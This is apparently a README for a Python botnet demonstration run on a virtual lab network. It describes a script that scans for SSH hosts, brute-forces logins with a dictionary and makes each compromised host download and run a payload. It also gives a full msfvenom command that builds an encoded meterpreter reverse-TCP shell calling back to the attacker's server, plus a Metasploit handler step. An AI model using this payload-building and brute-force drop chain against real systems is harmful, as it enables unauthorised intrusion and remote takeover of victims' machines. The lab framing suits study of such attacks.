# simple_bot:
Demonstration of a simple botnet written in Python.<br>
<br>
"scan_drop.py" scans virtual network. If it finds a node with ssh<br>
service. It then performs a dictionary attack. If successful, RCE directs<br>
target to download a meterpreter reverse shell payload & execute it.<br>
Multiprocessing allows for multiple targets to connect to our handler<br>
at once.<br>
<br>
<h3>Environment & Setup</h3>
1. Our Attack machine: <h4>Linux kali 4.16.0-kali2-amd64</h4>
2. Create Web Server: <h4>192.168.203.1/evil_file</h4>
3. 4 target ssh servers on the same virtual network: <h4>ubuntu-16.04.5-desktop-amd64</h4>
&nbsp;&nbsp;&nbsp;192.168.203.150&nbsp;&nbsp;user: fresh1 &nbsp;pass: fresh1<br>
&nbsp;&nbsp;&nbsp;192.168.203.151&nbsp;&nbsp;user: fresh2 &nbsp;pass: fresh2<br>
&nbsp;&nbsp;&nbsp;192.168.203.152&nbsp;&nbsp;user: fresh3 &nbsp;pass: fresh3<br>
&nbsp;&nbsp;&nbsp;192.168.203.153&nbsp;&nbsp;user: fresh4 &nbsp;pass: fresh4<br>
<br>
4. Create payload: <h4>msfvenom --payload linux/x86/meterpreter_reverse_tcp LPORT=443 LHOST=192.168.203.1 -e shikata_ga_nai -f elf -a x86 -o evil_file</h4>
5. msf5 > <h4>exploit/multi/handler module</h4>
6. Run scan_drop.py <h4>Scan, Dictionary Attack, RCE. </h4>
